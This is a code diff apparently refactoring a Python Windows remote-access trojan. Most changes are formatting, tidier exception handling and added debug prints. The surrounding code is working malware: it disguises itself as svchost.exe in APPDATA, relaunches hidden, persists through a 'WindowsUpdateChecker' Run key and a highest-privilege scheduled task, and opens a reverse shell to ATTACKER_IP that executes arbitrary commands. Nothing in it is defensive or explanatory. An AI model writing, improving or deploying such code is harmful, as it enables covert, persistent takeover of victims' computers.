@@ -14,25 +14,29 @@ def is_payload_instance():
     return PAYLOAD_ARG in sys.argv
 
 def get_dest_path():
-    return os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "svchost.exe")
-
-def delete_previous_copy(dest_path):
-    try:
-        if os.path.exists(dest_path):
-            os.remove(dest_path)
-    except:
-        pass
+    return os.path.join(
+        os.getenv("APPDATA"),
+        "Microsoft", "Windows", "svchost.exe"
+    )
 
 def relocate_and_run():
     dest_path = get_dest_path()
     os.makedirs(os.path.dirname(dest_path), exist_ok=True)
 
-    delete_previous_copy(dest_path)
+    # 🔥 Delete existing file if exists
+    if os.path.exists(dest_path):
+        try:
+            os.remove(dest_path)
+        except:
+            pass
 
     try:
         shutil.copy2(sys.executable, dest_path)
-        subprocess.Popen([dest_path, PAYLOAD_ARG], creationflags=subprocess.CREATE_NO_WINDOW)
-    except:
+        subprocess.Popen(
+            [dest_path, PAYLOAD_ARG],
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+    except Exception as e:
         pass
 
 def set_registry_persistence(path):
@@ -42,10 +46,10 @@ def set_registry_persistence(path):
             r"Software\Microsoft\Windows\CurrentVersion\Run",
             0, winreg.KEY_SET_VALUE
         )
-        # Overwrite or create afresh
+        # Overwrite or set value
         winreg.SetValueEx(key, "WindowsUpdateChecker", 0, winreg.REG_SZ, f'"{path}" {PAYLOAD_ARG}')
         winreg.CloseKey(key)
-    except:
+    except Exception as e:
         pass
 
 def try_create_schtask(path):
@@ -57,7 +61,7 @@ def try_create_schtask(path):
             "/rl", "HIGHEST", "/f"
         ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=False)
         return True
-    except:
+    except Exception as e:
         return False
 
 def establish_reverse_shell():
@@ -66,7 +70,6 @@ def establish_reverse_shell():
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ATTACKER_IP, ATTACKER_PORT))
         s.send(f"[+] Connected to {os.getenv('COMPUTERNAME')} as {os.getlogin()}\n".encode())
-
         while True:
             s.send(b"\n> ")
             command = s.recv(1024).decode().strip()
@@ -74,11 +77,7 @@ def establish_reverse_shell():
                 break
             if not command:
                 continue
-            output = subprocess.Popen(command, shell=True,
-                                      stdout=subprocess.PIPE,
-                                      stderr=subprocess.PIPE,
-                                      stdin=subprocess.DEVNULL,
-                                      creationflags=subprocess.CREATE_NO_WINDOW)
+            output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
             result, error = output.communicate()
             s.send(result + error)
         s.close()
@@ -87,6 +86,11 @@ def establish_reverse_shell():
 
 def main():
     dest_path = get_dest_path()
+
+    # 🔎 Debug prints for testing
+    print("Current Path:", sys.executable)
+    print("Destination Path:", dest_path)
+
     if is_payload_instance() or sys.executable.lower() == dest_path.lower():
         establish_reverse_shell()
     else:
